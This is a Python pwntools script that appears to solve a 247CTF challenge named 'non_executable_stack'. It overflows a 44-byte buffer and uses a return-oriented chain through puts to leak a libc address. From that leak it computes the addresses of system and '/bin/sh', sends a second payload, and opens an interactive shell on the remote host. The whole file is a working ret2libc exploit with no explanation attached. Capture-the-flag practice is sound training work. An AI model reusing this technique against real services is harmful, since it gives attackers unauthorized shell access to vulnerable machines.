
from pwn import *


# r = process('./non_executable_stack')
r = remote('bf81551967261bff.247ctf.com', 50335)
libc = ELF('./libc6-i386_2.27-3ubuntu1_amd64.so')  # https://libc.blukat.me/
# libc = ELF('/lib/i386-linux-gnu/libc.so.6') # local
elf = ELF('./non_executable_stack')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
puts_off = libc.sym['puts']

pop_ebx = 0x0804834d  # : pop ebx; ret;
chall = 0x080484D6

print(hex(puts_got))
print(hex(puts_plt))

r.recvline()

p = b'A' * 44
p += p32(puts_plt)
p += p32(pop_ebx)
p += p32(puts_got)
p += p32(0x0804853D)

r.sendline(p)

w = r.recv().split()
leak = u32(w[3][:4])
# leak = u32(w[3][:4]) # local

LIBC_BASE = leak - puts_off
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

print()
log.info('puts address       :' + hex(leak))
log.info('Libc base address  :' + hex(LIBC_BASE))
log.info('System address     :' + hex(ADDR_SYSTEM))
log.info('/bin/sh address    :' + hex(ADDR_BINSH))
print()

p = b'A' * 44
p += p32(ADDR_SYSTEM)
p += p32(0x0)
p += p32(ADDR_BINSH)

r.sendline(p)

r.interactive()
